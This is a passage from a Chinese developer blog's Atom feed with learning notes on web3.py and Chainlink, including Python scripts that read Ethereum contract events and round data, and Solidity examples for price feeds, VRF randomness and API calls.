    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, main</span><br><span class="line"><span class="keyword">from</span> usdt <span class="keyword">import</span> abi</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8545&quot;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(url))</span><br><span class="line">address = web3.toChecksumAddress(<span class="string">&#x27;0xdFB34E20656dbA9133fE13274005A1FC4926C7E3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">contract = web3.eth.contract(address=address, abi=abi)</span><br><span class="line">latest = web3.eth.blockNumber</span><br><span class="line">issueEvents = contract.events.Issue.createFilter(fromBlock=<span class="number">0</span>, toBlock=latest)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ParsingEvent</span>(<span class="params">data</span>):</span></span><br><span class="line">    issueList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        issueData = &#123;&#125;</span><br><span class="line">        issueData[<span class="string">&#x27;amount&#x27;</span>] = i[<span class="string">&#x27;args&#x27;</span>][<span class="string">&#x27;amount&#x27;</span>]</span><br><span class="line">        issueData[<span class="string">&#x27;address&#x27;</span>] = i[<span class="string">&#x27;address&#x27;</span>]</span><br><span class="line">        issueData[<span class="string">&#x27;blockNumber&#x27;</span>] = i[<span class="string">&#x27;blockNumber&#x27;</span>]</span><br><span class="line">        issueList.append(issueData)</span><br><span class="line">    <span class="keyword">return</span> issueList</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIssueEvents</span>(<span class="params">realtime</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        data = issueEvents.get_all_entries()</span><br><span class="line">        pprint(ParsingEvent(data))</span><br><span class="line">        time.sleep(realtime)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getIssueEvents(<span class="number">10</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.å†™ä¸ªåç«¯è·å–æš´éœ²ä¸ªAPI<br>2.chainlinké“¾ä¸Šè¯»å–<br>3.éƒ¨ç½²ä¸ŠæœåŠ¡å™¨å’Œropsten</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Web3.py" scheme="https://x1a0.net/categories/Web3-py/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="Python" scheme="https://x1a0.net/tags/Python/"/>
    
    <category term="web3.py" scheme="https://x1a0.net/tags/web3-py/"/>
    
  </entry>
  
  <entry>
    <title>web3.pyä½¿ç”¨å°è®°</title>
    <link href="https://x1a0.net/2021/12/13/web3-py%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/13/web3-py%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-12T16:00:31.000Z</published>
    <updated>2021-12-12T16:13:36.635Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥web3æä¾›è€…å’Œåˆçº¦abiã€åˆçº¦åœ°å€</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://kovan.infura.io/v3/34ed41c4cf28406885f032930d670036&#x27;</span>))</span><br><span class="line">abi = <span class="string">&quot;you contract abi&quot;</span></span><br><span class="line">addr = <span class="string">&#x27;0x9326BFA02ADD2366b30bacB125260Af641031331&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰åˆçº¦å®ä¾‹ï¼Œè°ƒç”¨åˆçº¦å‡½æ•°</span></span><br><span class="line">contract = web3.eth.contract(address=addr, abi=abi)</span><br><span class="line">validRoundId = <span class="number">18446744073709562301</span></span><br><span class="line">historicalData = contract.functions.getRoundData(validRoundId).call()</span><br><span class="line"><span class="built_in">print</span>(historicalData)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»Šå¤©å¿ƒæƒ…å¾ˆçƒ¦èºï¼Œå·²ç»åˆ°äº†é‚£ç§æƒ³æŠ’å‘å¿ƒæƒ…éƒ½æ‰¾ä¸åˆ°æ–‡å­—çš„ç¨‹åº¦äº†å—ã€‚</p><p>æƒ³å½“å¹´ä½ å¯æ˜¯ä¸€ä¸ªâ„¢çš„ç å­å°ç‹å­ã€‚</p><p>æƒ³å˜æˆä»€ä¹ˆæ ·å­å°±å»åšï¼Œ<br>è‹±é›„æ— æƒ§ï¼Œ<br>æ— æ¬²åˆ™åˆšã€‚</p><hr><p>ä¾‹å­æ¥è‡ªchainlinkæ–‡æ¡£ï¼Œæƒ³æ‰¾ä»¥å¤ªåŠçš„eventç°æˆçš„SDKæ‰¾ä¸åˆ°ã€‚<br>æ˜å¤©è‡ªå·±é€ è½®å­</p><p>æœ€è¿‘å²è¯—çº§æ¼æ´log4jæå¾—å¤©ç¿»åœ°è¦†çš„ï¼Œ<br>æŠ½æ—¶é—´å¤ç›˜</p><p>ç”Ÿå‘½ä¸æ¯ï¼Œå­¦ä¹ ä¸æ­¢</p>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span clas</summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Web3.py" scheme="https://x1a0.net/categories/Web3-py/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="web3.py" scheme="https://x1a0.net/tags/web3-py/"/>
    
  </entry>
  
  <entry>
    <title>chainlinkå­¦ä¹ å°è®°</title>
    <link href="https://x1a0.net/2021/12/07/chainlink%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/07/chainlink%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-07T03:04:41.000Z</published>
    <updated>2021-12-07T05:38:58.181Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨åˆçº¦ä¸­è·å–ä»¥å¤ªåŠçš„ä»·æ ¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract PriceConsumerV3 &#123;</span><br><span class="line"></span><br><span class="line">    AggregatorV3Interface internal priceFeed;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        <span class="comment">// å–‚ä»·åˆçº¦åœ°å€</span></span><br><span class="line">        priceFeed = AggregatorV3Interface(<span class="number">0x9326BFA02ADD2366b30bacB125260Af641031331</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è·å–æœ€åä¸€è½®ä»·æ ¼</span></span><br><span class="line">    <span class="function">function <span class="title">getLatestPrice</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(<span class="keyword">int</span>)</span> </span>&#123;</span><br><span class="line">        (</span><br><span class="line">            uint80 roundID, </span><br><span class="line">            <span class="keyword">int</span> price,</span><br><span class="line">            uint startedAt,</span><br><span class="line">            uint timeStamp,</span><br><span class="line">            uint80 answeredInRound</span><br><span class="line">        ) = priceFeed.latestRoundData();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/VRFConsumerBase.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract RandomNumberConsumer is VRFConsumerBase &#123;</span><br><span class="line">    </span><br><span class="line">    bytes32 internal keyHash;</span><br><span class="line">    uint256 internal fee;</span><br><span class="line">    </span><br><span class="line">    uint256 <span class="keyword">public</span> randomResult;</span><br><span class="line">    bytes32 <span class="keyword">public</span> resultId;</span><br><span class="line"></span><br><span class="line">    constructor() </span><br><span class="line">        VRFConsumerBase(</span><br><span class="line">            <span class="number">0xdD3782915140c8f3b190B5D67eAc6dc5760C46E9</span>, <span class="comment">// VRF Coordinator</span></span><br><span class="line">            <span class="number">0xa36085F69e2889c224210F603D836748e7dC0088</span>  <span class="comment">// LINK Token</span></span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        keyHash = <span class="number">0x6c3699283bda56ad74f6b855546325b68d482e983852a7a82979cc4807b641f4</span>;</span><br><span class="line">        fee = <span class="number">0.1</span> * <span class="number">10</span> ** <span class="number">18</span>; <span class="comment">// 0.1 LINK (Varies by network)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¯·æ±‚å‡½æ•°</span></span><br><span class="line">    <span class="function">function <span class="title">getRandomNumber</span><span class="params">()</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bytes32 requestId)</span> </span>&#123;</span><br><span class="line">        require(LINK.balanceOf(address(<span class="keyword">this</span>)) &gt;= fee, <span class="string">&quot;Not enough LINK - fill contract with faucet&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> requestRandomness(keyHash, fee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å›è°ƒå‡½æ•°</span></span><br><span class="line">    <span class="function">function <span class="title">fulfillRandomness</span><span class="params">(bytes32 requestId, uint256 randomness)</span> internal override </span>&#123;</span><br><span class="line">        randomResult = randomness;</span><br><span class="line">        resultId = requestId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åˆçº¦ä¸­ä½¿ç”¨éšæœºæ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/VRFConsumerBase.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/ConfirmedOwner.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract VRFD20 is VRFConsumerBase, ConfirmedOwner(msg.sender) &#123;</span><br><span class="line">    uint256 <span class="keyword">private</span> constant ROLL_IN_PROGRESS = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰å…¬é’¥å’Œè·å–éšæœºæ•°éœ€è¦çš„è´¹ç”¨</span></span><br><span class="line">    bytes32 <span class="keyword">private</span> s_keyHash;</span><br><span class="line">    uint256 <span class="keyword">private</span> s_fee;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// requestIDå’Œåœ°å€ä¹‹é—´çš„æ˜ å°„ å’Œ åœ°å€å’Œéª°å­å€¼ä¹‹é—´çš„æ˜ å°„</span></span><br><span class="line">    mapping(bytes32 =&gt; address) <span class="keyword">private</span> s_rollers;</span><br><span class="line">    mapping(address =&gt; uint256) <span class="keyword">private</span> s_results;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éšæœºæ•°è¿”å›äº‹ä»¶ éšæœºæ•°ä¸­requestIDå’Œåœ°å€ç»‘å®šäº‹ä»¶</span></span><br><span class="line">    <span class="function">event <span class="title">DiceRolled</span><span class="params">(bytes32 indexed requestId, address indexed roller)</span></span>;</span><br><span class="line">    <span class="function">event <span class="title">DiceLanded</span><span class="params">(bytes32 indexed requestId, uint256 indexed result)</span></span>;</span><br><span class="line"></span><br><span class="line">    constructor(address vrfCoordinator, address link, bytes32 keyHash, uint256 fee)</span><br><span class="line">        VRFConsumerBase(vrfCoordinator, link)</span><br><span class="line">    &#123;</span><br><span class="line">        s_keyHash = keyHash;</span><br><span class="line">        s_fee = fee;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ·éª°å­</span></span><br><span class="line">    <span class="function">function <span class="title">rollDice</span><span class="params">(address roller)</span> <span class="keyword">public</span> onlyOwner <span class="title">returns</span> <span class="params">(bytes32 requestId)</span> </span>&#123;</span><br><span class="line">        require(LINK.balanceOf(address(<span class="keyword">this</span>)) &gt;= s_fee, <span class="string">&quot;Not enough LINK to pay fee&quot;</span>);</span><br><span class="line">        require(s_results[roller] == <span class="number">0</span>, <span class="string">&quot;Already rolled&quot;</span>);</span><br><span class="line">        requestId = requestRandomness(s_keyHash, s_fee);</span><br><span class="line">        s_rollers[requestId] = roller;</span><br><span class="line">        <span class="comment">//å¦‚æœæ˜¯roll_in_progresså°±è¯´æ˜æ²¡æœ‰æ·æˆåŠŸ</span></span><br><span class="line">        s_results[roller] = ROLL_IN_PROGRESS;</span><br><span class="line">        <span class="function">emit <span class="title">DiceRolled</span><span class="params">(requestId, roller)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å›è°ƒå‡½æ•°</span></span><br><span class="line">    <span class="function">function <span class="title">fulfillRandomness</span><span class="params">(bytes32 requestId, uint256 randomness)</span> internal override </span>&#123;</span><br><span class="line">        uint256 d20Value = (randomness % <span class="number">20</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//callbackæ›´æ–°roll_in_progressï¼Œé€šè¿‡s_rollersæ‰¾åˆ°addressï¼Œé€šè¿‡addressè®¾ç½®éª°å­è¿”å›å€¼</span></span><br><span class="line">        s_results[s_rollers[requestId]] = d20Value;</span><br><span class="line">        <span class="function">emit <span class="title">DiceLanded</span><span class="params">(requestId, d20Value)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">house</span><span class="params">(address player)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(string memory)</span> </span>&#123;</span><br><span class="line">        require(s_results[player] != <span class="number">0</span>, <span class="string">&quot;Dice not rolled&quot;</span>);</span><br><span class="line">        require(s_results[player] != ROLL_IN_PROGRESS, <span class="string">&quot;Roll in progress&quot;</span>);</span><br><span class="line">        <span class="comment">// é€šè¿‡åœ°å€è·å–éšæœºæ•°ï¼Œåˆ†é…æˆ¿å­</span></span><br><span class="line">        <span class="keyword">return</span> getHouseName(s_results[player]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è½¬å‡ºlinkå‡½æ•°</span></span><br><span class="line">    <span class="function">function <span class="title">withdrawLINK</span><span class="params">(address to, uint256 value)</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">        require(LINK.transfer(to, value), <span class="string">&quot;Not enough LINK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setKeyHash</span><span class="params">(bytes32 keyHash)</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">        s_keyHash = keyHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">keyHash</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(bytes32)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s_keyHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setFee</span><span class="params">(uint256 fee)</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">        s_fee = fee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">fee</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s_fee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">getHouseName</span><span class="params">(uint256 id)</span> <span class="keyword">private</span> pure <span class="title">returns</span> <span class="params">(string memory)</span> </span>&#123;</span><br><span class="line">        string[<span class="number">20</span>] memory houseNames = [</span><br><span class="line">            <span class="string">&quot;Targaryen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Lannister&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Stark&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tyrell&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Baratheon&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Martell&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tully&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Bolton&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Greyjoy&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Arryn&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Frey&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Mormont&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tarley&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Dayne&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Umber&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Valeryon&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Manderly&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Clegane&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Glover&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Karstark&quot;</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">return</span> houseNames[id - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨åˆçº¦ä¸­è°ƒç”¨api</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/ChainlinkClient.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract APIConsumer is ChainlinkClient &#123;</span><br><span class="line">    using Chainlink <span class="keyword">for</span> Chainlink.Request;</span><br><span class="line">  </span><br><span class="line">    uint256 <span class="keyword">public</span> volume;</span><br><span class="line">    </span><br><span class="line">    address <span class="keyword">private</span> oracle;</span><br><span class="line">    bytes32 <span class="keyword">private</span> jobId;</span><br><span class="line">    uint256 <span class="keyword">private</span> fee;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        setPublicChainlinkToken();</span><br><span class="line">        oracle = <span class="number">0xc57B33452b4F7BB189bB5AfaE9cc4aBa1f7a4FD8</span>;</span><br><span class="line">        jobId = <span class="string">&quot;d5270d1c311941d0b08bead21fea7747&quot;</span>;</span><br><span class="line">        fee = <span class="number">0.1</span> * <span class="number">10</span> ** <span class="number">18</span>; <span class="comment">// (Varies by network and job)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">requestVolumeData</span><span class="params">()</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bytes32 requestId)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Chainlink.Request memory request = buildChainlinkRequest(jobId, address(<span class="keyword">this</span>), <span class="keyword">this</span>.fulfill.selector);</span><br><span class="line"></span><br><span class="line">        request.add(<span class="string">&quot;get&quot;</span>, <span class="string">&quot;https://min-api.cryptocompare.com/data/pricemultifull?fsyms=ETH&amp;tsyms=USD&quot;</span>);</span><br><span class="line"></span><br><span class="line">        request.add(<span class="string">&quot;path&quot;</span>, <span class="string">&quot;RAW.ETH.USD.OPENHOUR&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sendChainlinkRequestTo(oracle, request, fee);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">function <span class="title">fulfill</span><span class="params">(bytes32 _requestId, uint256 _volume)</span> <span class="keyword">public</span> <span class="title">recordChainlinkFulfillment</span><span class="params">(_requestId)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        volume = _volume;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åœ¨åˆçº¦ä¸­è·å–ä»¥å¤ªåŠçš„ä»·æ ¼&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/s</summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="chainlink" scheme="https://x1a0.net/tags/chainlink/"/>
    
  </entry>
  
  <entry>
    <title>flaskè“å›¾é€šä¿—æ˜“æ‡‚çš„ç†è§£</title>
    <link href="https://x1a0.net/2021/11/25/flask%E8%93%9D%E5%9B%BE%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://x1a0.net/2021/11/25/flask%E8%93%9D%E5%9B%BE%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E7%90%86%E8%A7%A3/</id>
    <published>2021-11-25T14:33:17.000Z</published>
    <updated>2021-11-25T14:39:36.016Z</updated>
    
